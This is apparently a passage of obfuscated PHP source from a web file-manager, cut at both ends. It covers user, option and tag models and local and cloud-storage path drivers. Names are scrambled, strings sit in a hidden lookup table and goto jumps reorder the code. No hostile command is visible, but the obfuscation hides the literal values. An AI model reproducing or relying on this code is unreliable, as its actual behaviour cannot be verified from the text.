$¹ÂÕ­ = Model($ìÊ•ÙÛ[2492])->where($˜Ğí­Ò¤)->select(); $¹ÂÕ­ = array_to_keyvalue_group($¹ÂÕ­, $ìÊ•ÙÛ[1778]); foreach ($¹ÂÕ­ as &$ˆ’¶úÖÃ) { $¸ºû¬§Ä = array(); foreach ($ˆ’¶úÖÃ as $Ü©Ìıù) { if (!in_array($Ü©Ìıù[$ìÊ•ÙÛ[107]], $¥İÎ·öÌ)) { $¸ºû¬§Ä[$Ü©Ìıù[$ìÊ•ÙÛ[107]]] = $Ü©Ìıù[$ìÊ•ÙÛ[462]]; } } $ˆ’¶úÖÃ = $¸ºû¬§Ä; } unset($ˆ’¶úÖÃ); $´ºŒ™¤ = Model($ìÊ•ÙÛ[2516]); foreach ($ÓæŒ½ö as &$®Êò¾ó) { $şµèïåİ = array(); if (isset($¹ÂÕ­[$®Êò¾ó[$ìÊ•ÙÛ[1778]]])) { $şµèïåİ = $¹ÂÕ­[$®Êò¾ó[$ìÊ•ÙÛ[1778]]]; } $®Êò¾ó[$ìÊ•ÙÛ[2517]] = array(); if (isset($şµèïåİ[$¯ªò–§])) { $®Êò¾ó[$ìÊ•ÙÛ[2517]] = $´ºŒ™¤->getUserJobInfo($şµèïåİ[$¯ªò–§]); } } unset($®Êò¾ó); } protected function groupUserAll($ŠîıÇïñ) { $†À¬ßã =& $_SERVER[¼èá¯æÙ]; if (!$ŠîıÇïñ) { return !1; } $ÊÛÍ”²À = Model($†À¬ßã[2073])->field($†À¬ßã[1778])->where(array($†À¬ßã[1979] => array($†À¬ßã[7], $ŠîıÇïñ)))->select(); $ÊÛÍ”²À = array_to_keyvalue($ÊÛÍ”²À, $†À¬ßã[12], $†À¬ßã[1778]); return array_unique($ÊÛÍ”²À); } public function userSearch($ëÑÉÒ±à, $ºôä´âÔ = "\52") { return Model($_SERVER[¼èá¯æÙ][608])->where($ëÑÉÒ±à)->field($ºôä´âÔ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¹¶›ÚšÎ) { $ŞĞ–ÓÖ =& $_SERVER[¼èá¯æÙ]; $¾¶½°Š = defined($ŞĞ–ÓÖ[2209]) && USER_ID ? USER_ID : $ŞĞ–ÓÖ[12]; return "\125\x73\x65\162\x4f\160\164\x69\157\156\137{$¹¶›ÚšÎ}\x5f" . $¾¶½°Š; } protected function filterWhere($·Ğñˆ³ô) { $”·£™ =& $_SERVER[¼èá¯æÙ]; $·Ğñˆ³ô[$”·£™[1778]] = defined($”·£™[2209]) && USER_ID ? USER_ID : $”·£™[12]; return $·Ğñˆ³ô; } public function cacheRemoveUser($é»âºæò, $Æµ‘ÆÄÊ) { return Cache::remove("\x55\x73\145\162\117\160\x74\x69\x6f\x6e\x5f{$é»âºæò}\x5f" . $Æµ‘ÆÄÊ); } protected function optionDefault($Ò™¤é­¥ = '') { $èÔò¬È¢ =& $_SERVER[¼èá¯æÙ]; if ($Ò™¤é­¥ == $èÔò¬È¢[12]) { return $GLOBALS[$èÔò¬È¢[6]][$èÔò¬È¢[2518]]; } if ($Ò™¤é­¥ == $èÔò¬È¢[2519]) { return $GLOBALS[$èÔò¬È¢[6]][$èÔò¬È¢[2520]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\x74\x61\147\x4c\151\163\164"; public $modelType = "\125\163\145\162\x4f\x70\164\x69\157\x6e"; public $field = array("\156\x61\x6d\145", "\163\164\171\154\145", "\163\157\x72\164"); public function listData($„š¡¬ç = false, $áí²¢£¹ = "\163\x6f\x72\164", $Ô¾Ë›°Ó = false) { return parent::listData($„š¡¬ç, $áí²¢£¹, $Ô¾Ë›°Ó); } public function remove($¹·àß·Ñ) { return parent::remove($¹·àß·Ñ); } public function add($Å…Ù˜Ó, $ıÒÙÏ” = "\x6c\x61\142\x65\154\55\147\162\x65\171\55\x6e\157\162\x6d\141\154") { $Ï»‡Üôã =& $_SERVER[¼èá¯æÙ]; if ($this->findByName($Å…Ù˜Ó)) { return !1; } $ô÷Â€¦ = array($Ï»‡Üôã[505] => $Å…Ù˜Ó, $Ï»‡Üôã[569] => $ıÒÙÏ”, $Ï»‡Üôã[1983] => $this->getSort($Ï»‡Üôã[347]) + 1); return parent::insert($ô÷Â€¦); } public function update($ıÜÜ¦Èû, $ªİ÷ã¸») { $²Õİ™Ê =& $_SERVER[¼èá¯æÙ]; $ÄƒÉææØ = $this->listData($ıÜÜ¦Èû); $ñöĞşÓ = $this->findByName($ªİ÷ã¸»[$²Õİ™Ê[32]]); if (!$ÄƒÉææØ || $ñöĞşÓ && $ñöĞşÓ[$²Õİ™Ê[486]] != $ÄƒÉææØ[$²Õİ™Ê[486]]) { return !1; } return parent::update($ıÜÜ¦Èû, $ªİ÷ã¸»); } public function moveTop($Ê×ÄâĞ) { $ŒÅ¶²­ =& $_SERVER[¼èá¯æÙ]; $œâ±££¨ = parent::listData(); $‰Ú²Ø²Ò = $this->getSort($ŒÅ¶²­[346]); foreach ($œâ±££¨ as &$øÄŠ€¡) { if ($øÄŠ€¡[$ŒÅ¶²­[486]] == $Ê×ÄâĞ) { $øÄŠ€¡[$ŒÅ¶²­[2003]] = $‰Ú²Ø²Ò; continue; } $øÄŠ€¡[$ŒÅ¶²­[2003]] += 1; } unset($øÄŠ€¡); return parent::resetData($œâ±££¨); } public function moveBottom($ßûô°) { $ş¿ş¹á =& $_SERVER[¼èá¯æÙ]; $Àæ½ŒÆ§ = $this->getSort($ş¿ş¹á[347]) + 1; return parent::update($ßûô°, array($ş¿ş¹á[2003] => $Àæ½ŒÆ§)); } public function resetSort($´¡ª¯‚–) { $á‡¸¹±‘ =& $_SERVER[¼èá¯æÙ]; $·ÖÆÌŞó = array(); $´¡ª¯‚– = is_array($´¡ª¯‚–) ? $´¡ª¯‚– : array(); for ($‡ÉÒöôä = 0; $‡ÉÒöôä < count($´¡ª¯‚–); $‡ÉÒöôä++) { $·ÖÆÌŞó[$´¡ª¯‚–[$‡ÉÒöôä] . $á‡¸¹±‘[12]] = $‡ÉÒöôä + 1; } $–äİÌÑœ = parent::listData(); foreach ($–äİÌÑœ as &$¤ †¥ÏÒ) { $Ä·¿ÑØî = $·ÖÆÌŞó[$¤ †¥ÏÒ[$á‡¸¹±‘[486]]]; $¤ †¥ÏÒ[$á‡¸¹±‘[2003]] = $Ä·¿ÑØî ? $Ä·¿ÑØî : $¤ †¥ÏÒ[$á‡¸¹±‘[2003]]; } unset($¤ †¥ÏÒ); return parent::resetData($–äİÌÑœ); } private function getSort($ÙŠ¢æ¢î) { $âÕ‰¦õ =& $_SERVER[¼èá¯æÙ]; $‚üî¥œ = parent::listData(); $Çä¦Å¼’ = array_to_keyvalue($‚üî¥œ, $âÕ‰¦õ[12], $âÕ‰¦õ[2003]); if (!$Çä¦Å¼’) { $Çä¦Å¼’ = array(0); } $¬¿¹‘ = $ÙŠ¢æ¢î == $âÕ‰¦õ[347] ? max($Çä¦Å¼’) : min($Çä¦Å¼’); return intval($¬¿¹‘); } } goto bæ˜ñ¨¾Óø; C¦Ï£‘åÉ‰: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ÂòûÔ‚Ç) { parent::__construct($ÂòûÔ‚Ç); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } public function uploadLink($åßÎœì£, $œ¥·ºÖ× = 0) { $úˆ——ª =& $_SERVER[¼èá¯æÙ]; if ($this->isUploadServer()) { return; } $€ôË§â = $this->getType(); if (!in_array($€ôË§â, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¦ÑÓ§ëî = (!$œ¥·ºÖ× ? 1 : ceil($œ¥·ºÖ× / pow(1024, 3))) * 3600 * 4; $Õåœ°¼¼ = $this->uploadMultiData($åßÎœì£, $¦ÑÓ§ëî); if ($Õåœ°¼¼) { $Õåœ°¼¼[$úˆ——ª[107]] = $åßÎœì£; $Õåœ°¼¼[$úˆ——ª[108]] = $€ôË§â; } return $Õåœ°¼¼; } public function fileOutImage($ˆ—û¾š·, $š±ß·á = 250) { if ($this->size($ˆ—û¾š·) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ˆ—û¾š·, $š±ß·á); } $Ø™Õ’ = $this->link($ˆ—û¾š·); $Ø™Õ’ .= $_SERVER[¼èá¯æÙ][1459] . $š±ß·á; $this->fileOutLink($Ø™Õ’); } public function fileOutLink($ç¦ª½Öğ) { $‡ ÷  =& $_SERVER[¼èá¯æÙ]; if (substr($ç¦ª½Öğ, 0, 7) == $‡ ÷ [228]) { $ç¦ª½Öğ = $‡ ÷ [229] . substr($ç¦ª½Öğ, 7); } header($‡ ÷ [185] . $ç¦ª½Öğ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($½»“ šâ) { if (substr($½»“ šâ, 0, 2) == $_SERVER[¼èá¯æÙ][1416]) { $½»“ šâ = BASIC_PATH . substr($½»“ šâ, 2); } return $½»“ šâ; } public function iconvApp($Å†‰ğ™) { $ôå¯¢Ø¦ =& $_SERVER[¼èá¯æÙ]; global $config; return $this->iconvTo($Å†‰ğ™, $config[$ôå¯¢Ø¦[1445]], $config[$ôå¯¢Ø¦[1444]]); } public function iconvSystem($­ÍÎÇçŒ) { $ı¯Ş°Îâ =& $_SERVER[¼èá¯æÙ]; global $config; return $this->iconvTo($­ÍÎÇçŒ, $config[$ı¯Ş°Îâ[1444]], $config[$ı¯Ş°Îâ[1445]]); } public function getPathOuter($šÆ²°£) { $¸¸“¢±€ =& $_SERVER[¼èá¯æÙ]; $£’çú›ı = $this->iconvApp($this->pathBase); $šÆ²°£ = $this->iconvApp($šÆ²°£); if (substr($£’çú›ı, 0, 2) == $¸¸“¢±€[1416]) { $£’çú›ı = BASIC_PATH . substr($£’çú›ı, 2); } if (substr($šÆ²°£, 0, 2) == $¸¸“¢±€[1416]) { $šÆ²°£ = BASIC_PATH . substr($šÆ²°£, 2); } $£’çú›ı = KodIO::clear($£’çú›ı); $šÆ²°£ = KodIO::clear($šÆ²°£); $šÆ²°£ = substr($šÆ²°£, strlen($£’çú›ı)); if (empty($this->pathDriver)) { return $šÆ²°£; } return $this->pathDriver . $¸¸“¢±€[8] . ltrim($šÆ²°£, $¸¸“¢±€[8]); } public function mkfile($–ù’“€ö, $Íœ÷ì‘æ = '', $îÑßê®â = REPEAT_RENAME) { $–ù’“€ö = $this->iconvSystem($–ù’“€ö); @touch($–ù’“€ö); if ($Íœ÷ì‘æ) { file_put_contents($–ù’“€ö, $Íœ÷ì‘æ); } @chmod($–ù’“€ö, $this->pathAuth); if (is_file($–ù’“€ö)) { return $this->getPathOuter($–ù’“€ö); } $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } public function mkdir($»í™ô¿§, $õÈÔÛ€˜ = REPEAT_SKIP) { $»í™ô¿§ = $this->iconvSystem($»í™ô¿§); if (is_dir($»í™ô¿§)) { return $this->getPathOuter($»í™ô¿§); } @mkdir($»í™ô¿§, $this->pathAuth, !0); @chmod($»í™ô¿§, $this->pathAuth); if (is_dir($»í™ô¿§)) { return $this->getPathOuter($»í™ô¿§); } $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } public function copyFile($êã‚µìÌ, $´ÕËã¶) { $this->mkdir($this->pathFather($´ÕËã¶)); $êã‚µìÌ = $this->iconvSystem($êã‚µìÌ); $´ÕËã¶ = $this->iconvSystem($´ÕËã¶); $Ì‘ù“Ÿ = copy_64($êã‚µìÌ, $´ÕËã¶); @chmod($´ÕËã¶, $this->pathAuth); if ($Ì‘ù“Ÿ) { return $this->getPathOuter($´ÕËã¶); } $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } public function moveFile($øÁ…øœ–, $–Ë•ë©) { $this->mkdir($this->pathFather($–Ë•ë©)); $øÁ…øœ– = $this->iconvSystem($øÁ…øœ–); $–Ë•ë© = $this->iconvSystem($–Ë•ë©); $¸¥©ç…“ = intval(@rename($øÁ…øœ–, $–Ë•ë©)); if (!$¸¥©ç…“) { if ($¸¥©ç…“ = intval(@copy_64($øÁ…øœ–, $–Ë•ë©))) { @unlink($øÁ…øœ–); } } @chmod($–Ë•ë©, $this->pathAuth); if ($¸¥©ç…“) { return $this->getPathOuter($–Ë•ë©); } $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } public function movePath($Åóé»‹, $µ‹½²¸—, $ıøÈ©¦å = false) { $êÕŸ‰— =& $_SERVER[¼èá¯æÙ]; $Åóé»‹ = $this->iconvSystem($Åóé»‹); $µ‹½²¸— = $this->iconvSystem($µ‹½²¸—); $ÛôÉÈ¡” = rtrim($µ‹½²¸—, $êÕŸ‰—[8]) . $êÕŸ‰—[8] . ($ıøÈ©¦å ? $ıøÈ©¦å : get_path_this($Åóé»‹)); if (file_exists($ÛôÉÈ¡”)) { return !1; } $‹°Š®’“ = intval(@rename($Åóé»‹, $ÛôÉÈ¡”)); $‹°Š®’“ = file_exists($ÛôÉÈ¡”); if ($‹°Š®’“) { return $this->getPathOuter($ÛôÉÈ¡”); } $this->writeLog(__FUNCTION__ . $êÕŸ‰—[1456], !0); return !1; } public function delFile($ÙšĞ¼õ) { $ÙšĞ¼õ = $this->iconvSystem($ÙšĞ¼õ); if (!@unlink($ÙšĞ¼õ)) { @chmod($ÙšĞ¼õ, $this->pathAuth); if (@unlink($ÙšĞ¼õ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } return !0; } public function delFolder($õ…§À¦) { $Óìè›µ =& $_SERVER[¼èá¯æÙ]; $õ…§À¦ = $this->iconvSystem($õ…§À¦); if (!is_dir($õ…§À¦)) { return !0; } if (!($Ç¸‰à¸‹ = opendir($õ…§À¦))) { return !1; } while (($š®¬ÎÄè = readdir($Ç¸‰à¸‹)) !== !1) { if ($š®¬ÎÄè == $Óìè›µ[10] || $š®¬ÎÄè == $Óìè›µ[1368]) { continue; } $±İ÷öÈˆ = $õ…§À¦ . $Óìè›µ[8] . $š®¬ÎÄè; if (is_file($±İ÷öÈˆ) || is_link($±İ÷öÈˆ)) { if (!unlink($±İ÷öÈˆ)) { chmod($±İ÷öÈˆ, $this->pathAuth); if (!unlink($±İ÷öÈˆ)) { return !1; } } } else { if (is_dir($±İ÷öÈˆ)) { chmod($±İ÷öÈˆ, $this->pathAuth); $±İ÷öÈˆ = $this->iconvApp($±İ÷öÈˆ); if (!$this->delFolder($±İ÷öÈˆ)) { return !1; } } } } closedir($Ç¸‰à¸‹); return rmdir($õ…§À¦); } public function rename($Ìëş£ö·, $Š¯¿¿úê) { $‹¬•ÔÀ¤ =& $_SERVER[¼èá¯æÙ]; $íÕğ³Ñõ = $this->fileNameAuto($this->pathFather($Ìëş£ö·), $Š¯¿¿úê); $íÕğ³Ñõ = $this->iconvSystem($íÕğ³Ñõ); $Ìëş£ö· = $this->iconvSystem($Ìëş£ö·); $ì¥’úï€ = $this->pathFather($Ìëş£ö·); $ÜÜ†©× = rtrim($ì¥’úï€, $‹¬•ÔÀ¤[8]) . $‹¬•ÔÀ¤[8] . $íÕğ³Ñõ; $şè“Á ¬ = @rename($Ìëş£ö·, $ÜÜ†©×); $ÜÜ†©× = $this->iconvApp($ÜÜ†©×); if ($şè“Á ¬) { return $this->getPathOuter($ÜÜ†©×); } $this->writeLog(__FUNCTION__ . $‹¬•ÔÀ¤[1456], !0); return !1; } public function size($ó¡š¾†) { $ó¡š¾† = $this->iconvSystem($ó¡š¾†); return filesize_64($ó¡š¾†); } public function info($œ„ú•õ—) { $œ„ú•õ— = $this->iconvSystem($œ„ú•õ—); if ($this->isFolder($œ„ú•õ—)) { return $this->folderInfo($œ„ú•õ—); } else { if ($this->isFile($œ„ú•õ—)) { return $this->fileInfo($œ„ú•õ—); } } return !1; } protected function infoChildren($¬´’§‚Î, &$¯Ù‚¬·ü, $¨î‰º·Û = true) { $± Å¦¡Ç =& $_SERVER[¼èá¯æÙ]; check_abort_echo(); $¬´’§‚Î = rtrim($¬´’§‚Î, $± Å¦¡Ç[8]) . $± Å¦¡Ç[8]; if ($¨î‰º·Û) { $¬´’§‚Î = $this->iconvSystem($¬´’§‚Î); } if (!($ ƒìê«© = @opendir($¬´’§‚Î))) { return; } while (($Ùİ˜€Å = readdir($ ƒìê«©)) !== !1) { if ($Ùİ˜€Å == $± Å¦¡Ç[10] || $Ùİ˜€Å == $± Å¦¡Ç[1368]) { continue; } $ê…Ş‰¦  = $¬´’§‚Î . $Ùİ˜€Å; if (is_file($ê…Ş‰¦ ) || is_link($ê…Ş‰¦ )) { $¯Ù‚¬·ü[$± Å¦¡Ç[90]]++; $¯Ù‚¬·ü[$± Å¦¡Ç[89]] += filesize_64($ê…Ş‰¦ ); } else { if (is_dir($ê…Ş‰¦ )) { $¯Ù‚¬·ü[$± Å¦¡Ç[91]]++; $this->infoChildren($ê…Ş‰¦ , $¯Ù‚¬·ü, !1); } } } closedir($ ƒìê«©); } private function folderInfo($‰¥ä¡ÈŒ, $Ê“‡¶Á = false) { $º´œª‡œ =& $_SERVER[¼èá¯æÙ]; $‰¥ä¡ÈŒ = rtrim($‰¥ä¡ÈŒ, $º´œª‡œ[8]) . $º´œª‡œ[8]; $Éğñæ‡¿ = $this->iconvApp($this->pathThis($‰¥ä¡ÈŒ)); if ($Ê“‡¶Á) { return array($º´œª‡œ[32] => $Éğñæ‡¿, $º´œª‡œ[97] => $this->getPathOuter($‰¥ä¡ÈŒ), $º´œª‡œ[33] => $º´œª‡œ[88]); } $ØÀµ»òš = array($º´œª‡œ[32] => $Éğñæ‡¿, $º´œª‡œ[97] => $this->getPathOuter($‰¥ä¡ÈŒ), $º´œª‡œ[33] => $º´œª‡œ[88], $º´œª‡œ[243] => @filectime($‰¥ä¡ÈŒ), $º´œª‡œ[98] => @filemtime($‰¥ä¡ÈŒ), $º´œª‡œ[1460] => @fileatime($‰¥ä¡ÈŒ), $º´œª‡œ[1461] => is_readable($‰¥ä¡ÈŒ), $º´œª‡œ[1462] => is_writable($‰¥ä¡ÈŒ), $º´œª‡œ[1463] => get_mode($‰¥ä¡ÈŒ)); return $ØÀµ»òš; } private function fileInfo($œ»¬äÜ±, $‰¿¾ûÓ³ = false) { $û—šíšá =& $_SERVER[¼èá¯æÙ]; $™™í¤Üš = $this->iconvApp($this->pathThis($œ»¬äÜ±)); if ($‰¿¾ûÓ³) { return array($û—šíšá[32] => $™™í¤Üš, $û—šíšá[97] => $this->getPathOuter($œ»¬äÜ±), $û—šíšá[33] => $û—šíšá[242], $û—šíšá[89] => $this->size($œ»¬äÜ±), $û—šíšá[179] => $this->ext($™™í¤Üš)); } $©¦›‚È = array($û—šíšá[32] => $™™í¤Üš, $û—šíšá[97] => $this->getPathOuter($œ»¬äÜ±), $û—šíšá[33] => $û—šíšá[242], $û—šíšá[243] => @filectime($œ»¬äÜ±), $û—šíšá[98] => @filemtime($œ»¬äÜ±), $û—šíšá[1460] => @fileatime($œ»¬äÜ±), $û—šíšá[89] => $this->size($œ»¬äÜ±), $û—šíšá[179] => $this->ext($™™í¤Üš), $û—šíšá[1461] => is_readable($œ»¬äÜ±), $û—šíšá[1462] => is_writable($œ»¬äÜ±), $û—šíšá[1463] => get_mode($œ»¬äÜ±)); return $©¦›‚È; } public function exist($³ıã¢”) { $³ıã¢” = $this->iconvSystem($³ıã¢”); return @file_exists($³ıã¢”); } public function isFile($« á×¥—) { $« á×¥— = $this->iconvSystem($« á×¥—); return @is_file($« á×¥—); } public function isFolder($ëŞ†¾‡ë) { $ëŞ†¾‡ë = $this->iconvSystem($ëŞ†¾‡ë); return @is_dir($ëŞ†¾‡ë); } public function listPath($È‰ŒÈ², $Œİıû¬‰ = false) { $Û†Ò“Ã® =& $_SERVER[¼èá¯æÙ]; $È‰ŒÈ² = $this->iconvSystem($È‰ŒÈ²); $È‰ŒÈ² = rtrim($È‰ŒÈ², $Û†Ò“Ã®[8]) . $Û†Ò“Ã®[8]; $•ïˆ“Û½ = array($Û†Ò“Ã®[95] => array(), $Û†Ò“Ã®[96] => array()); if (!($áş™©Ö¤ = @opendir($È‰ŒÈ²))) { return $•ïˆ“Û½; } while (($ºÃ¦ÊÅ = readdir($áş™©Ö¤)) !== !1) { if ($ºÃ¦ÊÅ == $Û†Ò“Ã®[10] || $ºÃ¦ÊÅ == $Û†Ò“Ã®[1368]) { continue; } $ºÜªæÂª = $È‰ŒÈ² . $ºÃ¦ÊÅ; if (is_file($ºÜªæÂª)) { $•ïˆ“Û½[$Û†Ò“Ã®[96]][] = $this->fileInfo($ºÜªæÂª, $Œİıû¬‰); } else { $•ïˆ“Û½[$Û†Ò“Ã®[95]][] = $this->folderInfo($ºÜªæÂª, $Œİıû¬‰); } } closedir($áş™©Ö¤); return $•ïˆ“Û½; } public function listAll($ï–“üº, &$Ó¹üŒˆÙ = array()) { $¹‹í©úû =& $_SERVER[¼èá¯æÙ]; $ï–“üº = $this->iconvSystem($ï–“üº); $ï–“üº = rtrim($ï–“üº, $¹‹í©úû[8]) . $¹‹í©úû[8]; if (!($¹—‡¡ = @opendir($ï–“üº))) { return $Ó¹üŒˆÙ; } while (($ùæŸìæ = readdir($¹—‡¡)) !== !1) { if ($ùæŸìæ == $¹‹í©úû[10] || $ùæŸìæ == $¹‹í©úû[1368]) { continue; } $Ç„Äš¼ = $ï–“üº . $ùæŸìæ; $ÈƒÓœÅû = is_dir($Ç„Äš¼) && !is_link($Ç„Äš¼) ? 1 : 0; $Ç„Äš¼ = $ÈƒÓœÅû ? $Ç„Äš¼ . $¹‹í©úû[8] : $Ç„Äš¼; $Ó¹üŒˆÙ[] = array($¹‹í©úû[97] => $Ç„Äš¼, $¹‹í©úû[88] => $ÈƒÓœÅû, $¹‹í©úû[98] => intval(@filemtime($Ç„Äš¼)), $¹‹í©úû[89] => $ÈƒÓœÅû ? 0 : intval($this->size($Ç„Äš¼))); if ($ÈƒÓœÅû) { $this->listAll($Ç„Äš¼, $Ó¹üŒˆÙ); } } closedir($¹—‡¡); return $Ó¹üŒˆÙ; } public function has($«§Æ’êä, $àûÆçÄ· = false, $¬Íââ¢ß = true) { $Õ¯Áë¢ß =& $_SERVER[¼èá¯æÙ]; $«§Æ’êä = $this->iconvSystem($«§Æ’êä); $«§Æ’êä = rtrim($«§Æ’êä, $Õ¯Áë¢ß[8]) . $Õ¯Áë¢ß[8]; if (!($ ãóéšï = @opendir($«§Æ’êä))) { return !1; } $ñ‡¹ã¥“ = 0; $ºëìâ£ó = 0; $æÃæ© = 0; while (($—ıŞÔó = readdir($ ãóéšï)) !== !1) { if ($—ıŞÔó == $Õ¯Áë¢ß[10] || $—ıŞÔó == $Õ¯Áë¢ß[1368]) { continue; } $æíÁºËÔ = $«§Æ’êä . $—ıŞÔó; if ($àûÆçÄ·) { $æÃæ©++; if (@is_file($æíÁºËÔ)) { $ñ‡¹ã¥“++; } else { $ºëìâ£ó++; } if ($æÃæ© > 10000) { break; } continue; } if ($¬Íââ¢ß) { if (@is_file($æíÁºËÔ)) { return !0; } } else { if (@is_dir($æíÁºËÔ . $Õ¯Áë¢ß[8])) { return !0; } } } closedir($ ãóéšï); if ($àûÆçÄ·) { return array($Õ¯Áë¢ß[251] => $ñ‡¹ã¥“, $Õ¯Áë¢ß[252] => $ºëìâ£ó); } return !1; } public function hashSimple($ÁªÚƒäë) { $úÛø¿Åì =& $_SERVER[¼èá¯æÙ]; if (!$ÁªÚƒäë) { return md5($úÛø¿Åì[12]); } $ÁªÚƒäë = $this->iconvSystem($ÁªÚƒäë); $ËÜ‰•„ñ = $this->size($ÁªÚƒäë); $Ëü¨®¢Ø = 200; $Çúğ…ı‚ = 50; if ($ËÜ‰•„ñ <= $Ëü¨®¢Ø * $Çúğ…ı‚) { return $this->hashMd5($ÁªÚƒäë) . $ËÜ‰•„ñ; } $ÒÅû‘· = $úÛø¿Åì[12]; $æûšÄèñ = intval($ËÜ‰•„ñ / $Çúğ…ı‚); $Áöú¾¬ = fopen($ÁªÚƒäë, $úÛø¿Åì[1464]); if (!$Áöú¾¬) { return $ÒÅû‘·; } for ($ÇñÉ™‚… = 0; $ÇñÉ™‚… < $Çúğ…ı‚; $ÇñÉ™‚…++) { fseek_64($Áöú¾¬, $æûšÄèñ * $ÇñÉ™‚…); $ÒÅû‘· .= fread($Áöú¾¬, $Ëü¨®¢Ø); } fseek_64($Áöú¾¬, $ËÜ‰•„ñ - $Ëü¨®¢Ø); $ÒÅû‘· .= fread($Áöú¾¬, $Ëü¨®¢Ø); fclose($Áöú¾¬); return md5($ÒÅû‘·) . $ËÜ‰•„ñ; } public function getContent($çüõÆ«) { $çüõÆ« = $this->iconvSystem($çüõÆ«); return file_get_contents($çüõÆ«); } public function setContent($Ò®Ş õ, $¿‚Ü¨Ş¿ = '') { $Ò®Ş õ = $this->iconvSystem($Ò®Ş õ); $¾ô±ˆùÖ = @file_put_contents($Ò®Ş õ, $¿‚Ü¨Ş¿, LOCK_EX); if (!$¾ô±ˆùÖ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); } clearstatcache(); @chmod($Ò®Ş õ, $this->pathAuth); return $¾ô±ˆùÖ === !1 ? !1 : !0; } public function fileSubstr($˜ÇµŸ©Ñ, $å ŠŸÕ = 0, $¦ÍùáŠº = false) { $Ì³ŞŠ” =& $_SERVER[¼èá¯æÙ]; $˜ÇµŸ©Ñ = $this->iconvSystem($˜ÇµŸ©Ñ); if ($¦ÍùáŠº === !1) { $¦ÍùáŠº = $this->size($˜ÇµŸ©Ñ); } if ($¦ÍùáŠº <= 0) { return $Ì³ŞŠ”[12]; } $ö‹ßğ‘ø = fopen($˜ÇµŸ©Ñ, $Ì³ŞŠ”[1464]); if (!$ö‹ßğ‘ø) { return !1; } fseek_64($ö‹ßğ‘ø, $å ŠŸÕ); $ŒçÌ«Áø = fread($ö‹ßğ‘ø, $¦ÍùáŠº); fclose($ö‹ßğ‘ø); if (!$ŒçÌ«Áø) { $this->writeLog(__FUNCTION__ . $Ì³ŞŠ”[1456], !0); } return $ŒçÌ«Áø; } public function upload($»‡Œ€ù›, $Áª¨‘æ, $•¤¼İ = false, $ƒèÁ¢İ„ = REPEAT_REPLACE) { if ($•¤¼İ) { return $this->moveFile($Áª¨‘æ, $»‡Œ€ù›); } return $this->copyFile($Áª¨‘æ, $»‡Œ€ù›); } public function setModifyTime($İØË§Í, $Ã¡Œù‰² = '') { @touch($İØË§Í, intval($Ã¡Œù‰²)); } public function download($ÖÉÒóÂ, $óøÏ‹Úè) { return $this->iconvSystem($ÖÉÒóÂ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Èü¶‚›) { parent::__construct($Èü¶‚›); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } public function fileOutImage($¨Ãè‰Œ, $¹ĞÓĞş÷ = 250) { $Õ÷öÍË =& $_SERVER[¼èá¯æÙ]; if ($this->size($¨Ãè‰Œ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¨Ãè‰Œ, $¹ĞÓĞş÷); } $—şãÅ›ß = array($Õ÷öÍË[1465] => $Õ÷öÍË[1466] . $¹ĞÓĞş÷ . $Õ÷öÍË[1467]); $ŞĞåšè¤ = $this->link($¨Ãè‰Œ, $—şãÅ›ß); $this->fileOutLink($ŞĞåšè¤); } public function fileOutLink($ŠÁ¿©ë˜) { $±­ô®ÍÈ =& $_SERVER[¼èá¯æÙ]; if (substr($ŠÁ¿©ë˜, 0, 7) == $±­ô®ÍÈ[228]) { $ŠÁ¿©ë˜ = $±­ô®ÍÈ[229] . substr($ŠÁ¿©ë˜, 7); } header($±­ô®ÍÈ[185] . $ŠÁ¿©ë˜); die; } } goto C¥™õÙñ; C¥™õÙñ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($£¦ÂÜ—õ) { parent::__construct($£¦ÂÜ—õ); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } public function fileOutLink($Šº¹”ô²) { $šşƒâ÷Â =& $_SERVER[¼èá¯æÙ]; if (substr($Šº¹”ô², 0, 7) == $šşƒâ÷Â[228]) { $Šº¹”ô² = $šşƒâ÷Â[229] . substr($Šº¹”ô², 7); } header($šşƒâ÷Â[185] . $Šº¹”ô²); die; } public function uploadFormData($À‡‰ù­Ò, $¾úµöâ = 3600) { return $this->uploadFormDataV2($À‡‰ù­Ò, $¾úµöâ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ïÛ¡’şÎ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¼èá¯æÙ][1468]; $this->_init($ïÛ¡’şÎ); } public function _init($õÊé¡Ñ•) { $ç­âüµğ =& $_SERVER[¼èá¯æÙ]; $this->config = $õÊé¡Ñ•; foreach ($õÊé¡Ñ• as $‘àöã => $İ•êÆÙŠ) { if (isset($this->{$‘àöã})) { $this->{$‘àöã} = $İ•êÆÙŠ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ç­âüµğ[1469] . LNG($ç­âüµğ[1470])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÍäŒÓ¥À =& $_SERVER[¼èá¯æÙ]; $´µàûĞ = new 